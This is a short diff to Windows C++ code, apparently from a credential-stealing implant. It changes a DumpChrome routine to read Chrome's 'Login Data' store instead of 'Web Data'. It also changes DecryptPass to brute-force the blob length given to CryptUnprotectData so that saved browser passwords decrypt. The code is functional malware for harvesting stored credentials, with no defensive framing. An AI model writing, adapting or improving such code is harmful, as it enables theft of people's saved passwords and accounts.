@@ -70,10 +70,15 @@ int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
 {
 	DATA_BLOB input;
 	input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cryptData));
-	input.cbData = static_cast<DWORD>(0xd0);
 	DATA_BLOB output;
+	DWORD blen;
 
-	if (!FNC(CryptUnprotectData)(&input, NULL, NULL, NULL, NULL, 0, &output))
+	for(blen=128; blen<=512; blen+=16) {
+		input.cbData = static_cast<DWORD>(blen);
+		if (FNC(CryptUnprotectData)(&input, NULL, NULL, NULL, NULL, 0, &output))
+			break;
+	}
+	if (blen>=512)
 		return 0;
 
 	CHAR *decrypted = (CHAR *)malloc(clearSize);
@@ -84,7 +89,7 @@ int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
 
 	memset(decrypted, 0, clearSize);
 	memcpy(decrypted, output.pbData, (clearSize < output.cbData) ? clearSize - 1 : output.cbData);
-	
+
 	_snwprintf_s(clearData, clearSize, _TRUNCATE, L"%S", decrypted);
 
 	free(decrypted);
@@ -171,7 +176,7 @@ int DumpChrome(void)
 	if (!InitCHLibs())	
 		return 0;
 
-	DumpSqlCH(ProfilePath, L"Web Data"); 
+	DumpSqlCH(ProfilePath, L"Login Data"); 
 	UnInitCHLibs();
 
 	return 0;
